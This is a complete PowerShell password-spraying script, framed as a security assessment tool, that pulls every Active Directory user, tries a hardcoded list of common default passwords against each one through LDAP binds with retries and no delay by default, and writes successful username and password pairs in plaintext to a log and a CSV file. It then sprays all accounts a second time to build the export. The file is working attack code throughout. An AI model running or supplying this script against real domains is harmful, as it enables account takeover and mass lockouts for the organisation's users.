<#
.SYNOPSIS
This PowerShell script performs password spraying against Active Directory user accounts and logs the authentication results.
.DESCRIPTION
Password spraying is a security assessment technique used to test the strength of user passwords in an environment. This script attempts various passwords against a list of Active Directory users and logs the results, including successful authentications and failures.
    NOTES
    File Name      : DA_Password_Spray.ps1
    Author         : Tyler Poniatowski
    Prerequisite   : Active Directory PowerShell module (Import-Module ActiveDirectory)
.PARAMETER DomainController
The hostname or IP address of the Active Directory domain controller to connect to. Default is "WinSrv2019".
.PARAMETER OutputFilePath
The path to the CSV file where authentication results will be exported. Default is "C:\Temp\AccountTest.csv".
.PARAMETER DelaySeconds
The number of seconds to wait between authentication attempts for each user. Default is 0 seconds (no delay).
.PARAMETER MaxRetries
The maximum number of authentication retries for each user. Default is 3 retries.
#>

# Check if the Active Directory module is available, and if not, try to import it

param (
    [string]$DomainController = "WinSrv2019",
    [string]$OutputFilePath = "C:\Temp\AccountTest.csv",
    [int]$DelaySeconds = 0,
    [int]$MaxRetries = 3
)

# Create a log file for recording script activities
$logFilePath = "C:\Temp\PasswordSprayLog.txt"
$scriptStartTimestamp = Get-Date

function Log-Message {
    param (
        [string]$Message
    )
    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
    $logMessage | Out-File -Append -FilePath $logFilePath
}

# Log script start
Log-Message "Script started at $scriptStartTimestamp"

$adModule = Get-Module -Name ActiveDirectory -ListAvailable

if ($adModule -eq $null) {
    Write-Host "Active Directory module not found. Attempting to import..."
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        Write-Host "Active Directory module imported successfully."
    }
    catch {
        Write-Host "Failed to import Active Directory module. Please make sure it's installed or import it manually."
        exit 1
    }
}

# Function to test authentication
function Test-Authentication {
    param (
        [string]$Username,
        [PSCredential]$Credential
    )

    $retryCount = 0
    do {
        try {
            $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($DomainController)
            $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
            $ldapConnection.Credential = $Credential

            $ldapConnection.Bind()
            
            # Authentication successful
            return "Authenticated"
        }
        catch {
            # Retry if necessary
            $retryCount++
        }
    }
    while ($retryCount -lt $MaxRetries)

    # Authentication failed after max retries
    return "Authentication Failed after $MaxRetries retries"
}

# Get all Active Directory users within the domain
$allUsers = Get-ADUser -Filter *

# Define a customizable password list (add or remove passwords as needed)
$passwords = @(
    "password123",
    "P@ssw0rd",
    "P@ssw0rd!",
    "securePwd123"
    "123456",           # Common default password
    "admin123",         # Common default password
    "letmein",          # Common default password
    "changeme",         # Common default password
    "root",             # Common default password for Linux root account
    "toor",             # Common default password for Linux root account
    "ubuntu",           # Common default password for Linux Ubuntu
    "raspberry",        # Common default password for Raspberry Pi
    "admin",            # Common default password for admin accounts
    "1234"              # Common default password
    # Add more passwords here
)

# Function to perform authentication testing for a user
function Test-UserAuthentication {
    param (
        [string]$Username
    )

    foreach ($password in $passwords) {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($Username, $securePassword)

        $authenticationResult = Test-Authentication -Username $Username -Credential $credential

        # Check if the authentication was successful
        if ($authenticationResult -eq "Authenticated") {
            # Log the result for successful authentication
            Log-Message "Authentication successful for $Username with password '$password'"
            # Output the result for successful authentication
            Write-Host "Authentication successful for $Username with password '$password'"
        }
        else {
            # Log the result for failed authentication
            Log-Message "Authentication failed for $Username with password '$password'"
        }

        # Add a time delay before the next login attempt
        Start-Sleep -Seconds $DelaySeconds
    }
}

# Loop through all users and test authentication
foreach ($user in $allUsers) {
    $username = $user.SamAccountName
    # Log the start of authentication testing for the user
    Log-Message "Starting authentication testing for user: $username"
    Test-UserAuthentication -Username $username
    # Log the completion of authentication testing for the user
    Log-Message "Completed authentication testing for user: $username"
}

# Export the authentication results to a CSV file
$authenticationResults = @()
foreach ($user in $allUsers) {
    $username = $user.SamAccountName
    foreach ($password in $passwords) {
        $authenticationResult = Test-Authentication -Username $username -Credential (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force)))
        $authenticationResults += [PSCustomObject]@{
            Username = $username
            Password = $password
            Result = $authenticationResult
        }
    }
}

$authenticationResults | Export-Csv -Path $OutputFilePath -NoTypeInformation
Write-Host "Authentication results exported to $OutputFilePath"

# Log script end
$scriptEndTimestamp = Get-Date
Log-Message "Script ended at $scriptEndTimestamp"
